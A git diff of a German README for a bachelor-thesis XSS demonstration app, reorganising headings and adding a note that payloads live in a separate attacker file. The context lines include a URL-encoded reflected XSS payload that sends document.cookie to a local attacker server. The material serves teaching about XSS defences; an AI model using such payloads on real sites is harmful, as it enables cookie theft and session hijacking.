@@ -9,6 +9,7 @@ Diese Webanwendung wurde im Rahmen einer Bachelorarbeit entwickelt, um XSS-Schwa
 - [Nutzung](#nutzung)
 - [Struktur der Anwendung](#struktur-der-anwendung)
 - [Mögliche Attacken](#mögliche-attacken)
+- [Anmekrung](#anmerkung)
 - [Lizenz](#lizenz)
 
 ## Einleitung
@@ -46,7 +47,9 @@ Der Befehl `npm start` im Root-Ordner startet sowohl den Angreifer-Server als au
     ```bash
     npm run start
 Für das jeweilige Starten der Server kann dies erreicht werden in dem man in den jeweiligen Ordner gewechselt wird.
-### Nutzung
+
+## Nutzung
+
 Diese Webanwendung bietet die Möglichkeit, zwischen verschiedenen Branches zu wechseln, die unterschiedliche XSS-Gegenmaßnahmen implementieren:
 
 - main Branch: Keine Gegenmaßnahme implementiert. Dieser Branch dient als Ausgangspunkt zur Untersuchung von XSS-Angriffen ohne Schutzmechanismen.
@@ -59,7 +62,7 @@ Diese Webanwendung bietet die Möglichkeit, zwischen verschiedenen Branches zu w
 - **backend**: Ist der Backend-Server der Webanwendung
 - **frontend**: Ist das Frontend und beinhaltet die HTML-Seiten
 
-### Mögliche Attacken
+## Mögliche Attacken
 
 - Stored XSS 
     - Ort: Biografiefeld im User Profile
@@ -87,6 +90,11 @@ Diese Webanwendung bietet die Möglichkeit, zwischen verschiedenen Branches zu w
     - Test-XSS-Payload: 
         - In Browser Suchleiste:    
             - ``http://localhost:3000/Echoinput.html?input=%3Cimg+src%3D+%22keinbild%22onerror%3D%22javascript%3Awindow.location%3D%27http%3A%2F%2Flocalhost%3A4000%2Fxss%3Fcookie%3D%27+%2B+encodeURIComponent%28document.cookie%29%3B%22%3E%3C%2Fimg%3E``
+
+## Anmerkung
+
+Die Payloads sind ebenfalls in der Datei `xss_payload.txt` zu finden. Diese Datei befindet sich im Verzeichnis `Attacker/src/xss_payload.txt`.
+
 
 ### Lizenz
 Dieses Projekt ist unter der MIT-Lizenz lizenziert.
